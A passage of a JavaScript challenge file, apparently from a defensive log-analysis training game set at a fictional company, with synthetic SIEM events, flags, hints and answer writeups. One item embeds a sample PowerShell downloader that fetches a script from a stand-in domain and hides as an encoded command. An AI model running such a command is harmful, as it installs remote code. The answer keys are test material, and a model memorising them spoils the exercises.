      goal: 'Find the address with the most failed logins and the user name it tried most often. Submit `HW{address_user}`, for example `HW{192.0.2.1_root}`.',
      flag: 'R524dhTYX3SuuIRFyjXOF5MI9hJPOcqmaQ==',
      workspace: () => {
        const r = random(2026);
        const events = [];
        const attackers = [
          ['203.0.113.14', 212, ['postgres', 'postgres', 'postgres', 'root', 'admin', 'git']],
          ['198.51.100.9', 205, ['root', 'root', 'root', 'admin', 'ubuntu']],
          ['192.0.2.150', 120, ['admin', 'test', 'user', 'root']],
          ['203.0.113.230', 64, ['root', 'pi', 'ubnt']],
          ['198.51.100.31', 41, ['oracle', 'root']]
        ];
        for (const [ip, count, users] of attackers) {
          let t = at(0, r.int(0, 50), r.int(0, 59));
          for (let i = 0; i < count; i++) {
            t += r.int(30, 120) * 1000;
            const user = r.pick(users);
            events.push(sshEvent(t, { host: 'web02', action: 'failure', user, ip, port: r.int(30000, 65000), invalid: !['root', 'git'].includes(user), pid: r.int(2000, 9000) }));
          }
        }
        for (let i = 0; i < 25; i++) {
          const [user, ip] = r.pick(STAFF);
          events.push(sshEvent(at(6, 30) + r.int(0, 3 * 3600) * 1000, { host: 'web02', action: 'success', user, ip, method: 'publickey', port: r.int(49152, 65000), pid: r.int(1000, 9000) }));
        }
        return { type: 'siem', events, start: 'index=linux host=web02' };
      },
      hints: ['Two questions, two searches. First find the noisiest address, then look only at that address.', 'Count failures per address with `stats count by src_ip`, then sort by count. For the second part, filter to that one address and use `top user`.', '`index=linux action=failure | stats count by src_ip | sort -count`, then `index=linux action=failure src_ip=<address> | top user limit=1`.'],
      writeup: {
        how: 'Counting failures per source shows `203.0.113.14` slightly ahead of `198.51.100.9`, so it is worth reading the numbers rather than glancing at the chart. Filtering to that address and running `top user` shows it went mostly after `postgres`, not root. The events say `invalid user postgres`, so the account does not even exist on web02.',
        why: 'Attackers often target the default accounts of whatever software they expect to find, such as postgres for databases or git for code servers. Knowing which accounts are being tried tells you what they are hoping is installed, and whether any of those accounts actually exist and need protecting.',
        fix: 'Allow only key based SSH logins, block or rate limit repeated failures, and keep service accounts like postgres unable to log in remotely at all.'
      }
    },
    {
      id: 'logs-web-scanner',
      title: 'What did the scanner find?',
      difficulty: 'easy',
      points: 100,
      skills: ['stats', 'status codes', 'pivoting'],
      prepare: ['logs-searching'],
      brief: 'The Larkfield website was hit by an automated scanner this morning. Scanners request hundreds of well known file names hoping something sensitive was left lying around. Almost all of those requests fail with 404, which is fine. What matters is whether any of them did not.',
      goal: 'Identify the scanner, find the one path it requested that the server actually returned with status 200, and submit it as `HW{path}`, for example `HW{/admin/login.php}`.',
      flag: 's8BvcKVaQxBNRl0dfqDV6f6Z/+I3EuaqyaGIeiJgKcqvdEokhK8=',
      workspace: () => {
        const r = random(404);
        const events = [];
        const pages = ['/', '/products', '/products/kettle', '/products/toaster', '/products/mixer', '/about', '/careers', '/contact', '/static/site.css', '/static/app.js', '/static/logo.svg', '/favicon.ico', '/robots.txt'];
        for (let i = 0; i < 900; i++) {
          const uri = r.pick(pages);
          const status = uri === '/favicon.ico' ? 404 : r.next() < 0.02 ? 404 : 200;
          events.push(webEvent(at(6) + r.int(0, 8 * 3600) * 1000, { ip: `192.0.2.${r.int(2, 120)}`, uri, status, bytes: status === 404 ? 162 : r.int(800, 24000) }));
        }
        const probes = ['/.env', '/.git/config', '/.git/HEAD', '/admin', '/admin/', '/administrator/', '/wp-login.php', '/wp-admin/', '/phpmyadmin/', '/server-status', '/backup.zip', '/backup.tar.gz', '/site.zip', '/www.zip', '/db.sql', '/database.sql', '/dump.sql', '/config.php', '/config.php.bak', '/web.config', '/.DS_Store', '/.htaccess', '/test.php', '/info.php', '/phpinfo.php', '/old/', '/dev/', '/staging/', '/api/swagger.json', '/actuator/env', '/console', '/login.php', '/shell.php', '/upload/', '/uploads/', '/backup/', '/backup/2025/', '/backup/2026/', '/backup/larkfield-site-2026-02.zip', '/logs/', '/cgi-bin/', '/.svn/entries', '/.aws/credentials', '/id_rsa', '/credentials.json', '/sitemap.xml'];
        let t = at(9, 12);
        for (const uri of r.shuffle(probes)) {
          for (let k = 0; k < (uri.endsWith('/') ? 3 : 2); k++) {
            t += r.int(200, 900);
            let status = 404;
            if (uri === '/backup/larkfield-site-2026-02.zip') status = 200;
            else if (['/.git/config', '/.git/HEAD', '/.htaccess', '/backup/'].includes(uri)) status = 403;
            else if (uri === '/admin') status = 301;
            else if (uri === '/sitemap.xml') status = 404;
            events.push(webEvent(t, { ip: '198.51.100.193', uri, status, bytes: status === 200 ? 48211337 : 162, ua: 'Mozilla/5.0 (compatible; scanner/2.4)' }));
          }
        }
        return { type: 'siem', events, start: 'index=web' };
      },
      hints: ['Start by finding who made the most requests, or the most 404s.', 'Once you have the address, look at its requests that did not fail. Status 200 means the server sent the file back.', '`index=web | stats count by src_ip | sort -count`, then `index=web src_ip=<address> status=200 | table _time, uri, bytes`.'],
      writeup: {
        how: 'Counting requests per address puts `198.51.100.193` far ahead, almost all 404s. Filtering that address to `status=200` leaves one path, `/backup/larkfield-site-2026-02.zip`, and the `bytes` field shows the server sent back about 48 MB. The 403 responses for `.git` and `/backup/` show the server blocked those, and the 301 for `/admin` is only a redirect.',
        why: 'Scanners are constant background noise on the internet, and teams rightly ignore most of them. The dangerous case is the rare request that succeeded. A full site backup can contain source code, configuration files and database passwords, so this one line turns a routine scan into an incident.',
        fix: 'Never keep backups inside the web root. Alert on any 200 response to an address that has just produced a burst of 404s, and review what is publicly reachable on a schedule.'
      }
    },
    {
      id: 'logs-spray',
      title: 'Low and slow',
      difficulty: 'medium',
      points: 150,
      skills: ['dc()', 'EventCode 4625', 'password spraying'],
      prepare: ['logs-auth', 'logs-windows'],
      brief: 'The domain controller logged a lot of failed logons (event 4625) yesterday evening. One service account locked itself out after a script kept using an old password, which is noisy but harmless. Somewhere underneath that noise, someone is quietly trying one password against many accounts.',
      goal: 'Find the address that is password spraying and the number of different accounts it tried. Submit `HW{address_count}`.',
      flag: 'EpREwOECcMXq8k0+OW6CEV25rQ==',
      workspace: () => {
        const r = random(4625);
        const events = [];
        const people = ['a.khan', 'j.smith', 'l.chen', 'm.garcia', 'r.oconnor', 'k.mensah', 'p.novak', 's.ito', 'd.walsh', 'e.rossi', 'f.okafor', 'g.berg', 'h.silva', 'i.kowalski', 't.nguyen', 'u.haddad', 'v.petrov', 'w.adeyemi', 'y.tanaka', 'z.fischer', 'b.murphy', 'c.dubois', 'n.larsen', 'o.costa', 'q.ahmed', 'x.lopez', 'm.brennan', 'k.osei', 'a.moreau', 'j.kaur', 'l.weber', 's.jensen', 'r.yilmaz', 'd.santos', 'e.nowak', 'h.kim', 'g.romano', 'f.ali'];
        // A script with an old password, retrying every 30 seconds.
        let t = at(17, 0);
        for (let i = 0; i < 180; i++) {
          t += 30000 + r.int(0, 500);
          events.push(winEvent(t, 4625, { host: 'DC01', user: 'svc_reports', logon_type: 3, src_ip: '10.0.7.45', failure_reason: 'bad password' }));
        }
        events.push(winEvent(at(17, 2, 40), 4740, { host: 'DC01', user: 'svc_reports', caller_host: 'SRV-REPORT01' }));
        // Staff typos, each followed by a success.
        for (let i = 0; i < 30; i++) {
          const user = r.pick(people);
          const time = at(16) + r.int(0, 5 * 3600) * 1000;
          const ip = `10.0.5.${r.int(10, 90)}`;
          for (let k = 0; k < r.int(1, 3); k++) events.push(winEvent(time + k * 9000, 4625, { host: 'DC01', user, logon_type: 3, src_ip: ip, failure_reason: 'bad password' }));
          events.push(winEvent(time + 40000, 4624, { host: 'DC01', user, logon_type: 3, src_ip: ip }));
        }
        // A brute force against one account from outside.
        t = at(18, 30);
        for (let i = 0; i < 60; i++) {
          t += r.int(2, 6) * 1000;
          events.push(winEvent(t, 4625, { host: 'DC01', user: 'administrator', logon_type: 3, src_ip: '192.0.2.77', failure_reason: 'bad password' }));
        }
        // The spray: two rounds, one attempt per account each, minutes apart.
        const sprayed = r.shuffle(people).slice(0, 34);
        t = at(19, 5);
        for (const round of [0, 1]) {
          for (const user of r.shuffle(sprayed)) {
            t += r.int(40, 110) * 1000;
            events.push(winEvent(t, 4625, { host: 'DC01', user, logon_type: 3, src_ip: '203.0.113.88', failure_reason: 'bad password' }));
          }
          t += 25 * 60000 + round;
        }
        return { type: 'siem', events, start: 'index=windows EventCode=4625' };
      },
      hints: ['Counting failures per address puts the noisy script and the brute force at the top. Spraying is about breadth, not volume.', 'Use `dc(user)` to count how many different accounts each address tried.', '`index=windows EventCode=4625 | stats count, dc(user) as accounts by src_ip | sort -accounts`'],
      writeup: {
        how: 'Sorting by the raw count of failures shows `10.0.7.45` (one service account, 180 failures) and `192.0.2.77` (one account, 60 failures) on top. Adding `dc(user)` reveals `203.0.113.88`: 68 failures spread across 34 different accounts, two attempts each, a minute or two apart. Staff typos come from many internal addresses and are each followed by a 4624 success.',
        why: 'Spraying works because lockout policies count failures per account. Two attempts per account, spread over an hour, never trips a lockout and never stands out in a "top talkers" chart. Detections need to count breadth (distinct accounts per source) as well as volume.',
        fix: 'Alert on many distinct failed accounts from one source, block legacy protocols that skip MFA, require MFA for every external logon, and ban common passwords such as season and year combinations.'
      }
    },
    {
      id: 'logs-got-in',
      title: 'One of them worked',
      difficulty: 'medium',
      points: 200,
      skills: ['action=success', 'auth_method', 'pivoting'],
      prepare: ['logs-auth', 'logs-timeline'],
      brief: 'Larkfield\'s Linux servers are hammered by password guessing every night and nobody pays much attention, because staff log in with SSH keys. This morning the overnight report looked a little different, and your lead wants a definite answer: did any of the guessing succeed?',
      goal: 'Find the account that an outside address managed to log in to, and the exact time of that login in UTC. Submit `HW{user_HH:MM:SS}`.',
      flag: 'EbX2E7X6GmZ7qBswgXzK7Vpx6A==',
      workspace: () => {
        const r = random(22);
        const events = [];
        const port = () => r.int(30000, 65000);
        const guessers = [['198.51.100.44', 160, ['root', 'admin', 'test']], ['203.0.113.19', 140, ['root', 'backup', 'backup', 'www-data', 'ftp']], ['192.0.2.201', 90, ['root', 'oracle']], ['203.0.113.140', 60, ['ubuntu', 'pi', 'admin']]];
        for (const [ip, count, users] of guessers) {
          let t = at(0, 5) + r.int(0, 3600) * 1000;
          for (let i = 0; i < count; i++) {
            t += r.int(20, 90) * 1000;
            const user = r.pick(users);
            events.push(sshEvent(t, { host: r.pick(['web01', 'web02', 'backup01']), action: 'failure', user, ip, port: port(), invalid: !['root', 'backup', 'www-data'].includes(user), pid: r.int(2000, 9000) }));
          }
        }
        // The guess that worked, on the backup server.
        events.push(sshEvent(at(4, 12, 55), { host: 'backup01', action: 'success', user: 'backup', ip: '203.0.113.19', port: 51877, method: 'password', pid: 7712 }));
        // Normal key logins, plus one staff member who used a password from inside.
        for (let i = 0; i < 40; i++) {
          const [user, ip] = r.pick(STAFF);
          events.push(sshEvent(at(7) + r.int(0, 4 * 3600) * 1000, { host: r.pick(['web01', 'web02', 'backup01', 'bastion']), action: 'success', user, ip, method: 'publickey', port: port(), pid: r.int(1000, 9000) }));
        }
        events.push(sshEvent(at(8, 41, 3), { host: 'bastion', action: 'failure', user: 'tom', ip: '10.0.4.22', port: 50201, pid: 1201 }));
        events.push(sshEvent(at(8, 41, 19), { host: 'bastion', action: 'success', user: 'tom', ip: '10.0.4.22', port: 50210, method: 'password', pid: 1201 }));
        return { type: 'siem', events, start: 'index=linux' };
      },
      hints: ['Ignore the failures for a moment. What do successful logins normally look like here, and is there one that does not fit?', 'Count successes by `auth_method` and `src_ip`. Staff use keys and internal addresses.', '`index=linux action=success | stats count by src_ip, user, auth_method`, then search the odd one out and read its exact time.'],
      writeup: {
        how: 'Successful logins are almost all `publickey` from 10.0.x.x addresses. Grouping successes by address and method leaves two password logins: tom from an internal address after one typo, which is normal, and `backup` from `203.0.113.19` at 04:12:55 on backup01. That same address had been failing against `backup` and other accounts for hours, so this is a guess that worked.',
        why: 'On an internet facing server, failures are background noise and a success is the signal. The detection that matters is not "many failures" but "a success from a source that was failing", or simply "any password login from outside" on systems where keys are the norm. The account name also tells you where to look next: a backup account usually has read access to a lot of data.',
        fix: 'Disable SSH password authentication, especially for service accounts, and alert on any successful login that does not match the expected method and source. Then treat backup01 as compromised: check what the account did, rotate its credentials and anything it could read.'
      }
    },
    {
      id: 'logs-new-admin',
      title: 'A new friend in Administrators',
      difficulty: 'medium',
      points: 200,
      skills: ['EventCode 4720', 'EventCode 4732', 'Windows accounts'],
      prepare: ['logs-windows'],
      brief: 'An attacker who gets into a machine often creates an account of their own, so they can come back even if the original way in is closed. The helpdesk created a few accounts today for new starters, which is normal. One account creation was not the helpdesk.',
      goal: 'Find the account that was created and then added to a local Administrators group, and the account that did it. Submit `HW{new_account_creator}`.',
      flag: 'x8N+XLm5JpinrnxksDZ2wjWwaMMTgg==',
      workspace: () => {
        const r = random(4720);
        const events = [];
        for (let i = 0; i < 160; i++) {
          events.push(winEvent(at(7) + r.int(0, 10 * 3600) * 1000, 4624, { host: r.pick(['WS-011', 'WS-014', 'WS-022', 'SRV-APP02', 'SRV-FILE01']), user: r.pick(['j.smith', 'a.khan', 'l.chen', 'svc_backup', 'm.garcia']), logon_type: r.pick([2, 3, 3, 5, 7]), src_ip: `10.0.5.${r.int(10, 90)}` }));
        }
        const starters = [['b.osei', at(9, 2)], ['c.lindqvist', at(9, 15)], ['d.amari', at(11, 48)]];
        for (const [user, time] of starters) {
          events.push(winEvent(time, 4720, { host: 'DC01', user, subject_user: 'helpdesk.anna' }));
          events.push(winEvent(time + 4000, 4722, { host: 'DC01', user, subject_user: 'helpdesk.anna' }));
          events.push(winEvent(time + 9000, 4728, { host: 'DC01', user, group: 'Domain Users', subject_user: 'helpdesk.anna' }));
        }
        events.push(winEvent(at(11, 50), 4732, { host: 'WS-022', user: 'd.amari', group: 'Remote Desktop Users', subject_user: 'helpdesk.anna' }));
        // The intruder, using a service account they had taken over.
        events.push(winEvent(at(13, 4, 10), 4624, { host: 'SRV-APP02', user: 'svc_backup', logon_type: 3, src_ip: '10.0.9.77' }));
        events.push(winEvent(at(13, 4, 11), 4672, { host: 'SRV-APP02', user: 'svc_backup', privileges: 'SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege' }));
        events.push(winEvent(at(13, 6, 2), 4688, { host: 'SRV-APP02', user: 'svc_backup', process: 'net.exe', parent_process: 'cmd.exe' }));
        events.push(winEvent(at(13, 6, 3), 4720, { host: 'SRV-APP02', user: 'supp0rt', subject_user: 'svc_backup' }));
        events.push(winEvent(at(13, 6, 4), 4722, { host: 'SRV-APP02', user: 'supp0rt', subject_user: 'svc_backup' }));
        events.push(winEvent(at(13, 6, 31), 4688, { host: 'SRV-APP02', user: 'svc_backup', process: 'net.exe', parent_process: 'cmd.exe' }));
        events.push(winEvent(at(13, 6, 32), 4732, { host: 'SRV-APP02', user: 'supp0rt', group: 'Administrators', subject_user: 'svc_backup' }));
        events.push(winEvent(at(13, 20, 15), 4624, { host: 'SRV-APP02', user: 'supp0rt', logon_type: 10, src_ip: '10.0.9.77' }));
        return { type: 'siem', events, start: 'index=windows' };
      },
      hints: ['Two event IDs matter: one for creating an account and one for adding it to a local group.', 'Search `EventCode=4720 OR EventCode=4732` and table the host, the account (`user`), the group and who did it (`subject_user`).', '`index=windows (EventCode=4720 OR EventCode=4732) | table _time, EventCode, host, user, group, subject_user`'],
      writeup: {
        how: 'Listing 4720 (account created) and 4732 (added to a local group) side by side shows the helpdesk creating three domain accounts on DC01, as expected. On SRV-APP02, the service account `svc_backup` created `supp0rt` (with a zero) and added it to the local Administrators group 29 seconds later. The 4688 events show `net.exe` doing both, and a Remote Desktop logon as `supp0rt` follows a quarter of an hour later.',
        why: 'Creating an account is one of the most common ways attackers keep access, and a name that imitates a normal one ("support", "admin", "helpdesk") is a classic choice. Service accounts should never create users: they run software, and an interactive action like this means someone is using its credentials.',
        fix: 'Alert on 4732 for privileged groups and on 4720 outside the helpdesk process, give service accounts only the rights they need, and stop them logging on interactively. Remove the account, reset `svc_backup`, and investigate 10.0.9.77.'
      }
    },
    {
      id: 'logs-encoded',
      title: 'The document that ran a command',
      difficulty: 'hard',
      points: 250,
      skills: ['EventCode 4688', 'parent processes', 'Base64', 'UTF-16'],
      prepare: ['logs-windows'],
      brief: 'Larkfield records process creation (4688) with full command lines. PowerShell runs all day here, for legitimate admin scripts and software deployment. A detection for Office applications starting PowerShell fired once this afternoon, and the command line is encoded so nobody can read it at a glance.\n\nThe Tools page (or the Base64 decoder in any analyst tool) will help with the encoding.',
      goal: 'Find the PowerShell process started by an Office application, decode its command, and submit the domain it tries to download from as `HW{domain}`.',
      flag: 'SjSSG4MMt6S2tiuiL8xs9Ar4SaGSlJvtsg6Eo+vKq/A5',
      workspace: () => {
        const r = random(4688);
        const events = [];
        const utf16 = (s) => toBase64(Uint8Array.from([...s].flatMap((ch) => [ch.charCodeAt(0), 0])));
        const normal = [
          ['explorer.exe', 'chrome.exe', '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"'],
          ['explorer.exe', 'outlook.exe', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"'],
          ['explorer.exe', 'winword.exe', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\l.chen\\Documents\\Q1 plan.docx"'],
          ['outlook.exe', 'excel.exe', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" "C:\\Users\\a.khan\\AppData\\Local\\Temp\\forecast.xlsx"'],
          ['ccmexec.exe', 'powershell.exe', 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1'],
          ['svchost.exe', 'powershell.exe', `powershell.exe -NoProfile -EncodedCommand ${utf16('Get-Service | Where-Object Status -eq Stopped | Out-File C:\\Ops\\stopped.txt')}`],
          ['explorer.exe', 'powershell.exe', 'powershell.exe'],
          ['services.exe', 'svchost.exe', 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p'],
          ['explorer.exe', 'teams.exe', '"C:\\Users\\j.smith\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"']
        ];
        for (let i = 0; i < 260; i++) {
          const [parent, process, cmd] = r.pick(normal);
          events.push(winEvent(at(8) + r.int(0, 9 * 3600) * 1000, 4688, { host: r.pick(['WS-011', 'WS-014', 'WS-022', 'WS-031', 'WS-040']), user: r.pick(['j.smith', 'a.khan', 'l.chen', 'm.garcia']), process, parent_process: parent, command_line: cmd }));
        }
        const payload = "$u='http://files.larkfield-invoices.test/view/7731.txt';$c=(New-Object Net.WebClient).DownloadString($u);Set-Content $env:TEMP\\update.ps1 $c";
        events.push(winEvent(at(14, 22, 7), 4688, { host: 'WS-022', user: 'm.garcia', process: 'winword.exe', parent_process: 'outlook.exe', command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\m.garcia\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q8K2\\Invoice_7731.docm"' }));
        events.push(winEvent(at(14, 22, 31), 4688, { host: 'WS-022', user: 'm.garcia', process: 'powershell.exe', parent_process: 'winword.exe', command_line: `powershell.exe -NoP -W Hidden -EncodedCommand ${utf16(payload)}` }));
        return { type: 'siem', events, start: 'index=windows EventCode=4688 process=powershell.exe' };
      },
      hints: ['Group PowerShell process starts by their parent process. Which parent does not belong?', '`index=windows EventCode=4688 process=powershell.exe | stats count by parent_process`, then open the event with the odd parent and copy the long string after `-EncodedCommand`.', 'Paste the string into Tools and use Base64 decode. PowerShell encodes commands as UTF-16, which the decoder recognises. The URL is in the first part of the decoded text.'],
      writeup: {
        how: 'Grouping PowerShell starts by parent shows the expected ones (the deployment agent `ccmexec.exe`, the scheduler `svchost.exe`, and people opening a console from `explorer.exe`) and one start from `winword.exe` on WS-022. The event just before it shows Word opening `Invoice_7731.docm` from Outlook\'s attachment cache, so the user opened a macro enabled attachment. The `-EncodedCommand` value is Base64 of UTF-16LE text. Decoded, it downloads a script from `files.larkfield-invoices.test` and saves it to the temp folder. The other encoded command, from svchost, is an ordinary admin task.',
        why: 'Encoding a command hides it from anyone skimming logs and from simple keyword rules, so detections that rely on the parent and child relationship are much more robust than ones that look for particular words. Office starting a shell is one of the most reliable signs of a malicious document.',
        fix: 'Block macros in files from the internet (now the Office default), use attack surface reduction rules that stop Office from creating child processes, and block the domain at the proxy. Then check whether `update.ps1` ran and what else WS-022 did afterwards.'
      }
    },
    {
      id: 'logs-beacon',
      title: 'Something checking in',
      difficulty: 'hard',
      points: 300,
      skills: ['proxy logs', 'beaconing', 'stats range', 'baselines'],
      prepare: ['logs-detections', 'logs-timeline'],
      brief: 'Malware usually needs to contact its operator for instructions. Many families do this on a timer, sending a small request every few minutes, which security people call **beaconing**. It is easy to miss because each request is tiny and looks like ordinary web traffic.\n\nYou have one day of web proxy logs from 30 workstations. Plenty of legitimate software also checks in on a timer, so regular traffic alone is not proof.',
      goal: 'Find the workstation that is beaconing and the domain it is contacting. Submit `HW{host_domain}`, for example `HW{WS-001_example.test}`.',
      flag: '6Ivr2umOsy/d+WJrFoiNGiTb7VnXDlTy2FVQ1/Q5zQ==',
      workspace: () => {
        const r = random(300);
        const events = [];
        const hosts = Array.from({ length: 30 }, (_, i) => [`WS-${String(i + 1).padStart(3, '0')}`, `10.0.8.${i + 11}`]);
        const users = ['j.smith', 'a.khan', 'l.chen', 'm.garcia', 'r.oconnor', 'k.mensah', 'p.novak', 's.ito', 'd.walsh', 'e.rossi'];
        const sites = [['www.bbc.co.uk', 'news'], ['outlook.office.com', 'business'], ['teams.microsoft.com', 'business'], ['www.google.com', 'search'], ['github.com', 'technology'], ['www.wikipedia.org', 'reference'], ['larkfield.example', 'business'], ['cdn.jsdelivr.net', 'technology'], ['www.linkedin.com', 'social'], ['weather.example.net', 'news']];
        for (const [host, ip] of hosts) {
          const user = r.pick(users);
          for (let i = 0; i < r.int(25, 60); i++) {
            const [dest, category] = r.pick(sites);
            events.push(proxyEvent(at(8) + r.int(0, 9 * 3600) * 1000, { ip, host, user, dest, path: r.pick(['/', '/index', '/api/v1/feed', '/static/main.js', '/search']), bytesOut: r.int(300, 1800), bytesIn: r.int(2000, 400000), category }));
          }
          // Every machine checks for updates hourly. Legitimate, and regular.
          for (let hour = 0; hour < 24; hour++) {
            events.push(proxyEvent(at(hour, r.int(0, 2), r.int(0, 59)), { ip, host, user: 'SYSTEM', dest: 'update.larkfield.example', path: '/check', bytesOut: 220, bytesIn: r.int(180, 900), ua: 'LarkUpdate/3.2', category: 'business' }));
          }
        }
        // A sync tool on a few machines, every 10 minutes during the day.
        for (const [host, ip] of hosts.slice(3, 9)) {
          for (let t = at(8, r.int(0, 9)); t < at(18); t += 600000 + r.int(-20000, 20000)) {
            events.push(proxyEvent(t, { ip, host, user: 'SYSTEM', dest: 'sync.filebox.example.com', path: '/delta', bytesOut: r.int(400, 900), bytesIn: r.int(300, 50000), ua: 'FileboxSync/9.1', category: 'file-sharing' }));
          }
        }
        // The beacon: one host, every five minutes, all day and night, same size each time.
        const [bHost, bIp] = hosts[17];
        for (let t = at(0, 3, 12); t < at(23, 59); t += 300000 + r.int(-4000, 4000)) {
          events.push(proxyEvent(t, { ip: bIp, host: bHost, user: 'm.garcia', dest: 'img.cdn-statics.test', path: '/pixel.gif', bytesOut: 312, bytesIn: 148, ua: 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)', category: 'uncategorized' }));
        }
        return { type: 'siem', events, start: 'index=proxy' };
      },
      hints: ['A beacon is regular, small, and usually goes to a place only one machine visits. Look at destinations first, not hosts.', 'For each destination, count requests, distinct hosts and the spread of `bytes_out`. A domain visited by one host, very often, with the same request size every time, is unusual.', '`index=proxy | stats count, dc(src_host) as hosts, dc(bytes_out) as sizes, values(category) as category by dest_host | sort -count`, then look at the destination with one host and one size.'],
      writeup: {
        how: 'Summarising by destination shows popular sites visited by many hosts with varied request sizes, the hourly updater on every host, and a sync tool on six hosts. One destination stands out: `img.cdn-statics.test`, uncategorised, visited by a single host, WS-018, about 288 times (every five minutes for 24 hours, including the night) with exactly 312 bytes out and 148 bytes in every time, using an outdated Internet Explorer user agent. `transaction src_host` or `stats range(_time)` on it confirms requests from just after midnight to the end of the day.',
        why: 'Beacons hide by being small and boring, but their regularity is also their weakness. Comparing every destination against how many hosts use it (rarity), how regular it is (timing), and how much the requests vary (size) exposes them, and none of those need you to already know the domain is bad.',
        fix: 'Block the domain, isolate WS-018 and start a host investigation. For detection, schedule a search for rare destinations with low variation in request size and timing, and alert on uncategorised domains contacted around the clock.'
      }
    }
  ]
};

